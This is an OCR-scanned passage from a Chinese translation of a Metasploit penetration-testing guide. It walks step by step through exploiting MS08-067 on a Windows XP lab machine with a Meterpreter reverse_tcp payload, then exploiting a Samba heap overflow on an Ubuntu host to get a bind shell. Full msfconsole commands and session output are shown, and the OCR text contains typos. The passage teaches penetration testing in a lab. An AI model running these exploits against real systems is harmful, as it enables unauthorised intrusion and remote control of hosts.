2003，但是由于没有在目标上发现服务器操作系统通常会开放的一些关键端口，所以是服务器
操作系统的可能性不大。）我们假定目标运行的WindowsXP是英文版。
下面让我们开始实际的攻击过程，首先是设置必需的参数：
msf>search ms08_067_netapi0
[*]Searching loaded modules for pattern‘mso8_067_netapi'...
Exploits
Name
Rank
Description
windows/smb/ms08_067_netapigreat
tMicrosoftServerServiceRelativePathStack
Corruption
msf>use windows/smb/mso8_o67_netapi@
msfexploit(mso8_067_netapi）>setPAYLoADwindows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(ms08_067_netapi)>show targets ①
Exploit targets:
IdName
0
Automatic Targeting
1
Windows 20oo Universal
2
Windows XP SPo/SP1Universal
3
Windows XP :SPz English (NX) 
4
Windows XP SP3 English (NX)
5
Windows 2003 SP0 Universal
6
Windows 2003 SP1 English (NO NX)
1
Windows 2003 SP1 English (NX)
8
Windows 2003 SP2 English (NO NX)
9
Windows 2003 SP2 English (Nx)
.SNIP..
26Windows XP SP2 Japanese(NX)
msf exploit(ms08_067_netapi)>setTARGET 3
target =>3
msf exploit(ms08_067_netapi)>set RH0ST 192.168.33.130 
RHOST =>192.168.33.130
msf exploit(ms08_067_netapi)>setLH0ST 192.168.33.129
LHOST => 192.168.33.129
msf exploit(ms08_067_netapi)> set LPoRT 8080 
LPORT=>8080
msfexploit(ms08_067_netapi)>showoptions
66
---
## Page 94
第5章渗透攻击之旅
Module options:
Name
Current Setting Required Description
RHOST
192.168.33.130
yes
The target address
RPORT
445
yes
Set theSMBserviceport
SMBPIPEBROWSER
yes
The pipe name to use (BROwSER, SRVSVC
Payload options (windows/meterpreter/reverse_tcp):
Name
Current SettingRequiredDescription
EXITFUNC
thread
yes
Exit technique:seh，thread，process
LHOST
192.168.33.129
yes
The local address
LPORT
8080
yes
The local port
Exploit target:
Id Name
--
3
Windows XP SP2 English(NX)
我们在Metasploit框架中查找MS08-067NetAPI攻击模块O。找到后，使用use命令?加载
这个模块（windows/smb/ms08_067_netapi）。
接下来，我们设置攻击载荷为基于Windows系统的Meterpreterreverse_tcp?，这个载荷
在攻击成功后，会从目标主机发起一个反弹连接，连接到LHOST中指定的IP地址。这种反弹
连接可以让你绕过防火墙的入站流量保护，或者穿透NAT网关。
Meterpreter是我们在本书中经常会用到的后渗透攻击工具，一般在攻击成功后会用到它。
Meterpreter是Metasploit框架中的杀手，它极大降低了我们获取目标信息和进行内网渗透的
难度。
showtargets命令O让我们能够识别和匹配目标操作系统类型。（大多数MSF渗透攻击模块
会自动对目标系统类型进行识别，而不需要手工指定此参数，但是针对MS08-067漏洞的攻击
中，通常无法正确地自动识别出系统类型。）
在处我们指定操作系统类型为WindowsXPSP2English（NX）。NX（NoExecute）意思
是“不允许执行”，即启用了DEP保护。在WindowsXPSP2中，DEP默认是启用的（仅对Windows
自身服务程序）。
在?处我们通过设置RHOST参数指定包含MS08-067漏洞的目标主机IP地址。
setLPORT命令设置攻击机监听的TCP端口号。（设置LPORT参数时，最好使用一个你觉
得防火墙一般会允许通行的常用端口号，例如443、80、53以及8080等都是不错的选择。）最
后，我们输入showoptions以确认这些参数都已设置正确。
67
---
## Page 95
Metasploit渗透测试指南
舞台搭好后，真正的好戏就要上演了：
msfexploit(ms08_067_netapi)>exploit0
[*]Startedreversehandleron 192.168.33.129:8080
[*]Triggering the vulnerability...
[*]Sending stage (748032 bytes)
[*]Meterpreter session 1 opened (192.168.33.129:8080 -> 192.168.33.130:1487)@
msf exploit(ms08_067_netapi) > sessions -1 ③
Active sessions
IdType
InformationConnection
1 meterpreter
192.168.33.129:8080 ->192.168.33.130:1036
msfexploit(ms08_067_netapi)>sessions-i1
[*]Starting interaction with1...
meterpreter > shell ①
Process 4060 created.
Channel 1 created.
Microsoft Windows XP[Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
C:\WINDOWS\system32>
我们使用exploit命令0初始化攻击环境，并开始对目标进行攻击尝试。这次攻击是成功的，
为我们返回了一个reverse_tcp方式的Meterpreter攻击载荷会话·，此时可以使用session-1命
令查看远程运行的Meterpreter情况。可以看到，目前仅有一个会话是活动的·，但如果我们
同时对多个目标进行了攻击，会同时开启多个会话。（如果想查看攻击创建的每一个Meterpreter
会话的详细信息，你可以输入sessions--v。）
在O处的sessions-i1命令让我们能够与ID为1的控制会话进行交互。注意此时我们进入
了Meterpreter的交互shell中。如果控制会话是一个反向连接命令行shell，这个命令会直接把
我们带到命令提示符状态下。最后，在处我们输入shell命令进入了目标系统的交互命令行shell
中。
祝贺你，你已经攻陷了你的第一台主机！此时，你仍然可以输入showoptions来查看攻击
模块所有可用的命令。
5.3攻击一台Ubuntu主机
让我们对Ubuntu9.04主机进行一次不同的攻击。攻击的步骤基本与上面例子相同，只是我
们在这里需要选择不同的渗透攻击与载荷模块。
68
---
## Page 96
第5章渗透攻击之旅
msf>nmap-sT-A-P0 192.168.33.132
[*] exec: nmap -sT -A -P0 192.168.33.132
Warning:Traceroute does not support idle or connect scan,disabling..
Nmap scan report for 192.168.33.132
Host is up (o.00048s latency).
Not shown: 997 closed ports
PORT
STATE SERVICE
VERSION
80/tcpopen
http
Apache httpd 2.2.3 ((Ubuntu) PHP/5.2.1)①
1_html-title:Index of/
139/tcp open
netbios-Ssn Samba Smbd 3.X（workgroup:MSHOME)@
445/tcpopen
netbios-ssn Samba smbd 3.x (workgroup: MSHOME)
MAC Address:00:0C:29:21:AD:08(VMware)
No exact OS matches for host (If you know what OS is running on it, see http://nmap.org/submit/ ).
Host script results:
I_nbstat:NetBIOS name:UBUNTU,NetBIOS user:，NetBIOS MAC:
I_smbv2-enabled:Server doesn't support SMBv2 protocol
|smb-os-discovery:
0S:Unix (Samba 3.0.24)
Name:MSHOME\Unknown
System time: 2011-03-15 17:39:57 UTC-4
OS and Service detection performed.Please report any incorrect results at http://nmap.org/submit/
Nmap done: 1 IP address (1 host up) scanned in 47.11 seconds
通过nmap扫描，我们看见3个开放的端口：80、139和445。在0处的信息告诉我们这台
主机操作系统为Ubuntu，?处我们看见它正运行着Samba3.x服务和附带PHP5.2.1的Apache
2.2.3服务。
让我们搜索一个Samba渗透攻击模块，并尝试用它来攻击这台主机。攻击流程如下：
msf>search samba
[*] Searching loaded modules for pattern 'samba'...
Auxiliary
Name
Rank
Description
admin/smb/samba_symlink_traversal
normal
Samba Symlink Directory Traversal
dos/samba/lsa_addprivs_heap
normal
Samba lsa_io_privilege_set Heap Overflow
dos/samba/lsa_transnames_heap
normal
Samba lsa_io_trans_names Heap Overflow
Exploits
Name
Rank
Description
 linux/samba/lsa_transnames_heap
good
Samba lsa_io_trans_names
SNIP.
msf>use linux/samba/lsa_transnames_heap
msf exploit(lsa_transnames_heap)>show payloads
69
---
## Page 97
Metasploit渗透测试指南
Compatible Payloads
Name
Rank
Description
generic/debug_trap
normal
Generic x86 Debug Trap
generic/shell_bind_tcp
normal
Generic Command Shell，Bind TCP Inline
generic/shell_reverse_tcp
normal
Generic Command Shell,Reverse TCP Inline
linux/x86/adduser
normal
Linux Add User
1inux/x86/chmod
Linux Chmod
linux/x86/exec
normal
Linux Execute Command
linux/x86/metsvc_bind_tcp
normal
Linux
Meterpreter Service,Bind TCP
linux/x86/metsvc_reverse_tcp
normal
Linux Meterpreter Service,Reverse TCP Inline
linux/x86/she11/bind_ipv6_tcp
normal
Linux
Command Shell,Bind TCP Stager (IPv6)
linux/x86/shel1/bind_tcp
Linux Command Shell, Bind TCP Stager
payload => linux/x86/shell_bind_tcp
msf exploit(lsa_transnames_heap)>setLPoRT 8080
LPORT =>8080
msf exploit(1sa_transnames_heap)>set RH0sT 192.168.33.132
RHOST => 192.168.33.132
msf exploit(lsa_transnames_heap)>exploit
[*] Creating nop sled....
[*]
Started bindhandler
[*]
Tryingtoexploit Sambawithaddress 0xffffe410..
[*]Connecting to the SMB service...
[*]Calling the vulnerable function...
[+]
Server did not respond, this is expected
[*] Command shell session 1 opened (192.168.33.129:41551 -> 192.168.33.132:8080)
ifconfig
eth1
Link encap:Ethernet
HWaddr00:0C:29:21:AD:08
inet addr:192.168.33.132
Bcast:192.168.33.255